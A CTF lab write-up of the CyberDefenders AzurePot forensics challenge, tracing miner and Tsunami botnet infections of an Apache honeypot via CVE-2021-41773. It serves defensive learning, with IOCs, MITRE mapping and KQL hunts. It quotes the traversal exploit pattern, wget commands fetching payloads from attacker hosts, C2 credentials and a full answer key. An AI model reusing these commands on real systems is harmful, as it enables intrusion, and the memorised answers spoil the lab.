---
date: 2026-07-04
platform: CyberDefenders
category: Endpoint Forensics
lab_name: AzurePot
source_url: https://cyberdefenders.org/blueteam-ctf-challenges/azurepot/
difficulty: Medium
time_taken: 1 hour
status: Completed
tags:
  - lab
mitre_techniques:
  - T1190, T1053.003, T1105, T1140, T1070.004, T1496
threat_actor: Kinsing, Tsunami/Mozi botnet
---
---
# AzurePot

## Scenario

> This Ubuntu Linux honeypot was put online in Azure in early October to watch what happens with those exploiting CVE-2021-41773. Initially, there was a large number of crypto miners that hit the system. You will see one cron script meant to remove files named `kinsing` in `/tmp`. This was a way of preventing these miners so more interesting things could occur.
> 
> Evidence provided (collected in this order):
> 
> - `sdb.vhd.gz` — VHD of the main drive (Azure disk snapshot)
> - `ubuntu.20211208.mem.gz` — Memory dump (captured via LiME)
> - `uac.tgz` — Results of UAC (Unix-like Artifacts Collector)

## Objective / Questions

- [x] Q1: Name of the script that runs every minute to do cleanup
- [x] Q2: Name of the 1st Bitcoin miner malware file terminated by that script
- [x] Q3: New permission the script sets on cleaned-up files
- [x] Q4: SHA256 of the botnet agent file
- [x] Q5: Name of the botnet in Q4
- [x] Q6: IP address matching the creation timestamp of the botnet agent file
- [x] Q7: URL used by the attacker to download the botnet agent
- [x] Q8: File downloaded to execute the malicious script and then remove itself
- [x] Q9: Names of the `.sh` scripts the attacker downloaded
- [x] Q10: PIDs of two suspicious processes running from a deleted directory
- [x] Q11: Suspicious command line associated with the 2nd PID in Q10
- [x] Q12: Remote IP/port used in the attack (from UAC process data)
- [x] Q13: User responsible for executing the command in Q11
- [x] Q14: PIDs of two suspicious shell processes running from `/tmp`
- [x] Q15: MAC address of the captured memory
- [x] Q16: Name of the `.sh` file downloaded, per bash history

## Tools Used

- FTK Imager (mount/browse `sdb.vhd`)
- grep / awk / `strings` (log and text triage)
- CyberChef (base64 decoding of injected payloads)
- Timeline Explorer (reviewing FTK directory-listing CSV exports)
- Volatility 2 (with a custom-built Linux profile) and Volatility 3 (`banner`, `linux_ifconfig`, `linux_bash`)
- Docker (Ubuntu 18.04 container to build the Volatility 2 Linux profile)
- VirusTotal (hash lookups / community comments for attribution)

## Analysis

### Initial Access / Entry Point

- Apache 2 web server on the honeypot was vulnerable to **CVE-2021-41773** (path traversal → unauthenticated RCE via `mod_cgi`), exploited using request paths like `/cgi-bin/.%2e/%2e%2e/...bin/bash`.
- `access_log` and `error_log` (`/var/log/apache2/`) show large volumes of exploitation attempts from many source IPs — consistent with opportunistic internet-wide scanning rather than a single targeted actor.

### Execution / Actions Observed

- Exploitation commands were injected via `echo; <payload> | bash`-style one-liners, frequently using `curl`/`wget` to fetch and execute secondary shell scripts, and later stages that pull **base64-encoded** payloads via a `s=` parameter (e.g. `.../b64.php?...` / `.../src.php`) and decode them with CyberChef/manual `base64 -d`.
- Decoded payloads implement a self-installing loader: pick a writable directory (`/var/log/...` → home dir → `/var/tmp` → `/tmp` fallback), create `~/.log/101001.../.spoollog` through `.log/101100/.spoollog` (100 sequential dummy subdirs, likely to blend in / evade simple detections), drop a marker file `.pinfo` containing `apache`, then beacon out to a C2 "online" check endpoint before pulling the actual `.src.sh` payload.

### Persistence

- `/root/.remove.sh` is present in `/var/spool/cron/crontabs` and runs **every minute** — ostensibly a "cleanup" job but functionally a competitor-eviction script (kills rival cryptominer processes and immutable-izes leftover miner binaries via `chmod 444`).
- The custom loader (decoded from the base64 payloads) re-creates its working directories under `.log/<n>/.spoollog` and re-drops `.src.sh` if not already running, functioning as a self-healing persistence/respawn mechanism independent of cron.

### Privilege Escalation

- No privilege escalation observed; all identified activity runs in the context of the web-server service account (`daemon`) or the honeypot's `apache`/`azureuser` accounts — consistent with a web-shell-driven compromise with no evidence of escalation to root.

### Defense Evasion

- `/root/.remove.sh` kills competing miner processes (`kinsing`, `kdevtmp*`) and sets their files to `chmod 444` (read-only) — likely to "lock in" a preferred miner or block clean-up by rival malware, and to make the honeypot appear used by a single dominant crypto-miner.
- Payload delivery is staged and base64-obfuscated (multi-hop: online-check → `src.php` → `b64.php` with `s=` param) rather than a single direct download, raising the effort needed to reconstruct the full chain from logs alone.
- Dropped botnet agent (`dk86`) was staged under `/var/tmp` rather than `/tmp`, apparently to avoid collocating with the more obviously "noisy" `/tmp` miner activity.
- Files/processes tied to the loader run from directories that are later deleted (`(deleted)` entries in `lsof`), removing the on-disk artifact while the process remains resident in memory.

### Lateral Movement

- No evidence of lateral movement; single honeypot host, no indications of internal network pivoting in the provided artifacts.

### C2 / Exfiltration

- C2/loader infrastructure identified: `rr.blueheaven[.]live` (online/status check endpoint `1010/online.php`) and `116.203.212[.]184` (fallback/secondary C2 serving `1010/src.php` and `1010/b64.php`), both accessed over HTTP with basic auth (`client:%@123-456@%`).
- Botnet agent (`dk86`, Tsunami/Mozi family) download source: `138.197.206.223` (path under `/wp-content/themes/twentysixteen/dk86` on a compromised WordPress site being reused as a distribution host).
- No clear data-exfiltration channel identified in the provided evidence; observed traffic is consistent with C2 check-in/beaconing and payload retrieval rather than exfil.

### Impact

- Host resources hijacked for **cryptocurrency mining** (Kinsing family and related miners) and enrollment into a **Tsunami/Mozi-linked botnet** via the `dk86` agent.
- Multiple competing opportunistic campaigns effectively fought over the same box (miner-killing cron job, repeated re-infection attempts, multiple unrelated `.sh` droppers) — a good illustration of the "crowded honeypot" phenomenon.

### Evidence Reviewed

- **Artifact:** `/var/spool/cron/crontabs` (disk image) **Finding:** Per-minute cron entry `* * * * * /root/.remove.sh` **Why it matters:** Establishes persistence mechanism and starting point for the miner-eviction script analysis (Q1).
    
- **Artifact:** `/root/.remove.sh` (disk image) **Finding:** Kills `kinsing`/`kdevtmp*` processes, then `chown root.root` + `chmod 444` on `/tmp/k*` **Why it matters:** Confirms the miner names being targeted and the permission-hardening behavior (Q2, Q3).
    
- **Artifact:** `/var/tmp/dk86` (disk image) **Finding:** ELF binary, SHA256 `0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049`; VirusTotal community tags it Tsunami-family, with commentary linking activity to Log4j-related campaigns **Why it matters:** Identifies the "botnet agent" and its family, and gives a pivot hash for further OSINT (Q4, Q5).
    
- **Artifact:** `/var/log/apache2/access_log` and `error_log` **Finding:** Requests from `141.135.85.36` at `11/Nov/2021:19:09:51` (access_log) exploiting the path-traversal RCE; `error_log` around `19:07:41`–`19:09:29` same day shows `wget -O dk86 http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86` **Why it matters:** Ties the `dk86` file's on-disk creation timestamp to a specific source IP and download URL (Q6, Q7).
    
- **Artifact:** `/var/log/apache2/error_log` (broader November window) **Finding:** Base64-encoded `s=` parameter to `b64.php`/`src.php` decodes to a self-installing shell loader; final decoded block ends in `rm -rf .install` **Why it matters:** Identifies `.install` as the file used to run the malicious script and then delete itself (Q8) — required expanding the search window and grep filter beyond the first obvious C2 domain.
    
- **Artifact:** `/var/log/apache2/error_log` **Finding:** Distinct download requests for `0_cron.sh`, `0_linux.sh`, and `ap.sh` from separate source IPs/domains **Why it matters:** Confirms multiple, likely unrelated, opportunistic actors dropping their own `.sh` stagers on the same host (Q9).
    
- **Artifact:** UAC `live_response/process/lsof_-nPl.txt` **Finding:** Processes `sleep` (PID 6388) and `sh` (PID 20645) with cwd `/var/tmp/.log/101068/.spoollog (deleted)` **Why it matters:** Identifies the two processes running from a deleted directory tied to the custom loader (Q10).
    
- **Artifact:** UAC `live_response/process/ps_-ef.txt` **Finding:** PID 20645 command line: `sh .src.sh`, user `daemon`, started `Nov14` **Why it matters:** Confirms the exact command and executing user (Q11, Q13).
    
- **Artifact:** UAC `live_response/process/proc/<pid>/environ.txt` **Finding:** `REMOTE_ADDR=116.202.187.77`, `REMOTE_PORT=56590` **Why it matters:** Gives the remote IP/port associated with the process at time of collection (Q12).
    
- **Artifact:** UAC `live_response/process/lsof_-nPl.txt` (filtered on `/tmp`) **Finding:** `sh` PIDs 15853 and 21785 with cwd `/tmp` **Why it matters:** Identifies the two suspicious shell processes running from `/tmp` (Q14).
    
- **Artifact:** Memory image `ubuntu.20211208.mem` via custom Volatility 2 Linux profile (`LinuxUbuntu-azurex64`) / `linux_ifconfig` **Finding:** `eth0` MAC `00:22:48:26:3b:16` **Why it matters:** Answers the memory MAC-address question and validates that the custom-built profile works correctly (Q15).
    
- **Artifact:** Memory image, `linux_bash` plugin output **Finding:** Bash history entries include `wget http://88.218.227.141/wget.sh` and `wget http://185.191.32.198/unk.sh`; the latter matches the expected file-naming pattern and its source IP is flagged malicious on VirusTotal **Why it matters:** Identifies `unk.sh` as the answer file for the bash-history question (Q16).
    

## Timeline

|Time (UTC)|Event|Source|
|---|---|---|
|Early Oct 2021|Honeypot placed online in Azure|Scenario brief|
|~Oct 2021 onward|Mass exploitation of CVE-2021-41773 by crypto-miner campaigns (kinsing, kdevtmp*)|Disk (`/tmp`), Apache logs|
|2021-11-01 10:15:10|`curl/wget ap.sh` payload injected (one of several `.sh` stagers)|`error_log`|
|2021-11-07 07:14:37|`ap.sh` re-fetched from `45.137.155.55`|`error_log`|
|2021-11-07 10:39:12|`0_cron.sh` downloaded from `103.55.36.245`|`error_log`|
|2021-11-07 10:52:33|`0_linux.sh` downloaded from `103.55.36.245`|`error_log`|
|2021-11-11 19:07:41|`dk86` first downloaded to CWD from `138.197.206.223`|`error_log`|
|2021-11-11 19:09:29|`dk86` downloaded again to `/tmp`|`error_log`|
|2021-11-11 19:09:51|Exploitation request from `141.135.85.36` recorded (creation-time match for `dk86`)|`access_log`|
|Nov 14, 2021 (year inferred)|`sh .src.sh` process (PID 20645) observed running as `daemon` from deleted `.spoollog` dir|UAC `ps_-ef.txt`|
|2021-12-08 16:12:31|Bash history: `wget http://88.218.227.141/wget.sh` and `wget http://185.191.32.198/unk.sh`|Memory (`linux_bash`)|
|2021-12-08 (mem capture)|Memory image acquired via LiME|Scenario brief|
|After mem capture|UAC live-response collection run|Scenario brief|

## Threat Actor / Attribution

- **Group / Campaign:** No single named group; overlapping opportunistic campaigns — Kinsing cryptomining cluster, a Tsunami/Mozi-linked botnet agent (`dk86`) with reported ties to Log4j-adjacent activity per VT community notes, and an independent custom loader using `blueheaven[.]live` / `116.203.212.184` infrastructure.
- **Confidence:** Low-to-moderate per cluster (each individually well-evidenced by IOC/behavior overlap), low confidence on any single unifying actor.
- **Basis for attribution:** VirusTotal community tagging on the `dk86` hash; distinct, non-overlapping C2 domains/IPs and delivery hosts per cluster; honeypot nature of the host makes multiple concurrent opportunistic actors expected rather than one coordinated campaign.

## Indicators / Artifacts

### Network

- `138.197.206.223` — hosting `dk86` (Tsunami/Mozi agent) via a compromised WordPress path
- `rr.blueheaven[.]live` — loader "online check" C2 (`/1010/online.php`)
- `116.203.212.184` — fallback/secondary C2 (`/1010/src.php`, `/1010/b64.php`)
- `45.137.155.55`, `103.55.36.245` — hosts serving `ap.sh`, `0_cron.sh`, `0_linux.sh`
- `88.218.227.141`, `185.191.32.198` — hosts serving `wget.sh`, `unk.sh` (from bash history)
- `141.135.85.36` — source IP exploiting CVE-2021-41773 at time of `dk86` creation
- `116.202.187.77:56590` — remote IP/port recorded in UAC process environment data

### Host

- `/root/.remove.sh` — per-minute cron cleanup/miner-eviction script
- `/tmp/kinsing`, `/tmp/kdevtmpfsi*` — cryptominer artifacts
- `/var/tmp/dk86` — botnet agent (SHA256 `0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049`)
- `.log/101001.../.spoollog` (100 sequential dirs), `.pinfo` (contains `apache`), `.src.sh`, `.cron.sh`, `.install`, `.interface` — loader working set
- `0_cron.sh`, `0_linux.sh`, `ap.sh`, `wget.sh`, `unk.sh` — separately dropped shell stagers

### Cloud

- Azure VM disk snapshot (`sdb.vhd`) and memory capture used as sole cloud-native evidence sources; no Azure control-plane logs included in this evidence set.

### Actor Infrastructure

- Compromised WordPress host reused as a malware distribution point (`138.197.206.223/wp-content/themes/twentysixteen/dk86`).
- Basic-auth-protected C2 panel style (`client:%@123-456@%`) fronting `online.php` / `src.php` / `b64.php` endpoints on `blueheaven[.]live` and `116.203.212.184`.

## MITRE ATT&CK Mapping

|Tactic|Technique|ID|
|---|---|---|
|Initial Access|Exploit Public-Facing Application (CVE-2021-41773 path traversal RCE)|T1190|
|Persistence|Scheduled Task/Job: Cron|T1053.003|
|Command and Control|Ingress Tool Transfer|T1105|
|Defense Evasion|Deobfuscate/Decode Files or Information (base64 payload delivery)|T1140|
|Defense Evasion|Indicator Removal: File Deletion (self-deleting `.install`, deleted-dir processes)|T1070.004|
|Impact|Resource Hijacking (cryptomining)|T1496|

## Detection Opportunities

```kql
// Example hunting logic (Sysmon/Linux Auditd-style, adapted for KQL over a normalized process/network table)
// 1) Detect base64-encoded curl/wget payloads passed via HTTP parameters
DeviceProcessEvents
| where ProcessCommandLine has_any ("curl", "wget")
| where ProcessCommandLine has "data-urlencode"
| where ProcessCommandLine matches regex @"s=[A-Za-z0-9+/=]{40,}"

// 2) Detect creation of large sequential directory sets (loader "blend-in" pattern)
DeviceFileEvents
| where FolderPath has ".spoollog"
| summarize DirCount = dcount(FolderPath) by InitiatingProcessAccountName, bin(Timestamp, 5m)
| where DirCount > 50

// 3) Detect processes executing from a deleted file path (common rootkit/loader evasion)
DeviceProcessEvents
| where FolderPath has "(deleted)"

// 4) Detect cron jobs that chmod/chown newly dropped binaries to 444 (permission-lock pattern)
DeviceProcessEvents
| where ProcessCommandLine has "chmod 444" and ProcessCommandLine has "/tmp/"
```

## Answers / Flags

|Question|Answer|
|---|---|
|Q1|`.remove.sh`|
|Q2|`kinsing`|
|Q3|`444`|
|Q4|`0e574fd30e806fe4298b3cbccb8d1089454f42f52892f87554325cb352646049`|
|Q5|`Tsunami`|
|Q6|`141.135.85.36`|
|Q7|`http://138.197.206.223:80/wp-content/themes/twentysixteen/dk86`|
|Q8|`.install`|
|Q9|`0_cron.sh, 0_linux.sh, ap.sh`|
|Q10|`6388, 20645`|
|Q11|`sh .src.sh`|
|Q12|`116.202.187.77:56590`|
|Q13|`daemon`|
|Q14|`15853, 21785`|
|Q15|`00:22:48:26:3b:16`|
|Q16|`unk.sh`|

## Key Takeaways

- Honeypots exposed to a known unauthenticated RCE (CVE-2021-41773) rapidly attract **multiple, unrelated opportunistic actors**; don't assume a single coherent campaign just because artifacts coexist on one host.
- A miner-eviction cron job (`.remove.sh`) is itself a strong detection signal — legitimate cleanup scripts rarely `pkill` specific named processes and then chmod files to `444`.
- Multi-stage, base64-parameterized payload delivery (`online.php` → `src.php` → `b64.php`) meaningfully raises analysis cost; a naive grep on one C2 domain can miss the actual delivery mechanism (as happened with the first pass at Q8) — widening the time window and grep pattern was necessary.
- UAC's `lsof` and per-process `proc/<pid>/` captures (`environ.txt`, `fd.txt`) are high-value for quickly tying PIDs to command lines, users, and network context without needing full memory analysis.
- Building a correct Volatility 2 Linux profile (matching kernel version + Ubuntu base image in Docker) is a real prerequisite step worth having pre-staged/scripted for future Linux memory challenges.

## References

- CyberDefenders AzurePot challenge: https://cyberdefenders.org/blueteam-ctf-challenges/101/
- nathan.out write-up (April 2023)
- "Random Noob" GitBook write-up (AzurePot section)
- VirusTotal community comments on `dk86` sample (SHA256 above)
- CVE-2021-41773 (Apache HTTP Server path traversal / RCE)
- Volatility Linux profile build reference: "Security Post-it #3 – Volatility Linux Profiles"
